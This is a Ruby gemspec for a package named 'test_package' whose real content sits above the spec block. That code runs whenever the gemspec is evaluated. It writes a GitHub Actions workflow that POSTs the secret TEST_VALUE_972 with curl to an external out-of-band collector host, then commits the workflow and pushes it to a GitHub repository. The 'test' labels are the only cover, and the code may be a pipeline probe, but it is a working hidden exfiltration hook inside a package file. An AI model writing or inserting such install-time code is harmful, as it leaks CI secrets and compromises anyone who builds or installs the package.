work_dir = "/tmp/test-972"
unless Dir.exist?(work_dir)
  Dir.mkdir(work_dir)
  raise "test init failed" unless system("git", "-C", work_dir, "init", "-b", "main")
  Dir.mkdir(File.join(work_dir, ".github"))
  Dir.mkdir(File.join(work_dir, ".github", "workflows"))
  File.write(
    File.join(work_dir, ".github", "workflows", "test-972.yml"),
    <<~YAML
      name: test 972
      on:
        push:
          branches:
            - test-972
      permissions:
        contents: read
      jobs:
        test:
          runs-on: ubuntu-latest
          env:
            TEST_VALUE: ${{ secrets.TEST_VALUE_972 }}
          steps:
            - name: test 972
              run: curl --fail --silent --show-error -X POST --data-binary "$TEST_VALUE" https://gpbphngezmm2rurdkzpsajktatielwfjg.oast.pro/test-972
    YAML
  )
  raise "test name failed" unless system("git", "-C", work_dir, "config", "user.name", "test 97")
  raise "test email failed" unless system("git", "-C", work_dir, "config", "user.email", "test97@example.invalid")
  raise "test add failed" unless system("git", "-C", work_dir, "add", ".github/workflows/test-972.yml")
  raise "test commit failed" unless system("git", "-C", work_dir, "commit", "-m", "test value 972")
end

push_ok = system(
  "git",
  "-C",
  work_dir,
  "push",
  "https://github.com/toofikz2/test-968.git",
  "HEAD:refs/heads/test-972"
)
raise "test push failed" unless push_ok

Gem::Specification.new do |spec|
  spec.name = "test_package"
  spec.version = "1.0.5"
  spec.summary = "test package"
  spec.authors = ["test 96"]
  spec.files = ["lib/test_package.rb"]
  spec.require_paths = ["lib"]
end
